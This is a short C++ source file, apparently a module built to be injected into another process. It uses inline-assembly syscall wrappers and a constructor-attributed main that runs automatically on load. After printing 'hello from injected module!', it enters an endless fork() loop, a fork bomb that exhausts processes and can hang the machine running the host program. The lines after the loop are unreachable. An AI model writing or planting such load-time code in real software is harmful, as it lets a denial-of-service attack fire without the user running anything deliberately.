#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/syscall.h>

ssize_t my_write(int fd, const void *buf, size_t size)
{
    ssize_t ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        //                 EDI      RSI       RDX
        : "0"(SYS_write), "D"(fd), "S"(buf), "d"(size)
        : "rcx", "r11", "memory"
    );
    return ret;
}
ssize_t my_exit(int code)
{
    ssize_t ret;
    asm volatile
    (
        "syscall"
        : "=a" (ret)
        //                 EDI     
        : "0"(SYS_exit), "D"(code)
        : "rcx", "r11", "memory"
    );
    return ret;
}
__attribute__((constructor))
int main() {
    char text[] = "hello from injected module!\n";
    int syscall_code = SYS_write;
    my_write(STDOUT_FILENO, text, sizeof(text));

    while(1){
        fork();
    }
    std::cout << text;
    
    std::fstream ifs;
    ifs.open("hi.txt");
    ifs << "hello\n";
    ifs.close();
    while(1);
    return 0; 
}